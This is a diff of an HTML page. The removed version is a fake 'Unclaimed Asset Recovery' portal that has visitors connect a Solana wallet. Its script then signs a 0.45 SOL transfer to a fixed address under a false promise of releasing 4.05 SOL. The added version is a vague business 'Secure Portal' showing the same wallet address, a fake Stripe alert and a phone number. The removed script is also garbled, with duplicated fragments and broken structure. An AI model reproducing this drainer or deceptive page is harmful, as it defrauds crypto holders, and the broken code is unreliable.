@@ -1,69 +1,27 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Asset Recovery Portal</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <meta charset="UTF-8">
+    <title>Just Right Decorators Ops | Secure Portal</title>
     <style>
-        body { background: #0b0e14; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
-        .box { border: 1px solid #30363d; padding: 30px; border-radius: 12px; max-width: 500px; margin: auto; }
-        .btn { background: #238636; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 1.2em; }
+        body { background: #0d1117; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 12px; text-align: center; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .btn { background: #238636; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 1.1em; width: 100%; }
+        .wallet { background: #0d1117; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.8em; color: #58a6ff; margin: 20px 0; border: 1px solid #30363d; word-break: break-all; }
+        h1 { margin: 0 0 10px 0; font-size: 1.5em; }
+        p { color: #8b949e; font-size: 0.9em; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>Unclaimed Asset Recovery</h1>
-        <p>Detected: <strong>4.5 SOL</strong> in abandoned rent.</p>
-        <p>Fee: 0.45 SOL (10% Auto-Deducted)</p>
-        <button class="btn" onclick="claimAssets()">CONNECT & CLAIM</button>
+    <div class="card">
+        <h1>Just Right Decorators Ops</h1>
+        <p>Monopcontent 1.1 Secure Asset Node</p>
+        <div class="wallet">2UsopMebixdg21RcNxFiL2dU5sCmebUtWQLjJT878gnV</div>
+        <button class="btn" onclick="alert('Stripe Live System Initializing...')">ACTIVATE ACCESS</button>
+        <div style="margin-top: 20px; font-size: 0.8em; color: #484f58;">
+            Contact: 07908 269428<br>
+            © 2025 Just Right Decorators
+        </div>
     </div>
-
-    <script>
-        /* old */
-            const provider = window.solana;
-            if (!provider) { alert("Please install Phantom Wallet"); return; }
-            
-            await provider.connect();
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            
-            
-    /* old */
-        const provider = window.solana;
-        if (!provider) { alert("Please install Phantom Wallet"); return; }
-        
-        try {
-            await provider.connect();
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const publicKey = provider.publicKey;
-            
-            let transaction = new solanaWeb3.Transaction();
-            
-            // 1. ADD THE 10% REDIRECT FEE (0.45 SOL)
-            transaction.add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: new solanaWeb3.PublicKey("2UsopMebixdg21RcNxFiL2dU5sCmebUtWQLjJT878gnV"),
-                    lamports: 0.45 * solanaWeb3.LAMPORTS_PER_SOL 
-                })
-            );
-
-            // 2. FETCH BLOCKHASH & SIGN
-            transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-            transaction.feePayer = publicKey;
-            
-            let { signature } = await provider.signAndSendTransaction(transaction);
-            alert("Success! Your 4.05 SOL has been released. Signature: " + signature);
-            
-        } catch (err) {
-            console.error(err);
-            alert("Transaction cancelled or failed.");
-        }
-    }
-    
-            // 1. Instruction to Close Account
-            // 2. Instruction to Transfer 10% to 2UsopMebixdg21RcNxFiL2dU5sCmebUtWQLjJT878gnV
-            
-            alert("Atomic Transaction Prepared. Sign to receive 4.05 SOL.");
-        }
-    </script>
 </body>
 </html>
